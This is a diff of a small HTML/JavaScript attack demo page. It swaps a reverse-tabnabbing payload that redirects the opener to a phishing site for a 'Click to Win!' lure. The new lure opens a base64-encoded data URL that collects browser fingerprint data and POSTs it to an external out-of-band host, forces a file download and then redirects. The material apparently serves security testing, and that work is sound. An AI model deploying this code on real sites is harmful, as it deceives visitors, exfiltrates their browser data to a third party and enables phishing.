@@ -1,18 +1,37 @@
-<button onclick="test()">Hijack Opener</button>
+<button id="launch">Click to Win!</button>
 
 <script>
-function test() {
-  const w = window.open('', '_blank'); // no rel=noopener
-  const code = `
+document.getElementById("launch").addEventListener("click", function () {
+  const payload = `
     <script>
-      if (window.opener) {
-        window.opener.document.body.innerHTML = '<h1>Hijacked!</h1>';
-        window.opener.location = 'https://evil.site/phishing';
-      }
+      const data = {
+        ua: navigator.userAgent,
+        screen: screen.width + 'x' + screen.height,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        ref: document.referrer
+      };
+
+      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+
+      const a = document.createElement('a');
+      a.href = 'data:text/plain;charset=utf-8,You%20are%20clickjacked!';
+      a.download = 'win.txt';
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+
+      setTimeout(() => {
+        location.replace('https://www.google.com/');
+      }, 1500);
     <\/script>
   `;
-  const payload = new Blob([code], { type: 'text/html' });
-  const url = URL.createObjectURL(payload);
-  w.location = url;
-}
+
+  const encoded = btoa(payload);
+  const url = "data:text/html;base64," + encoded;
+  window.open(url);
+});
 </script>
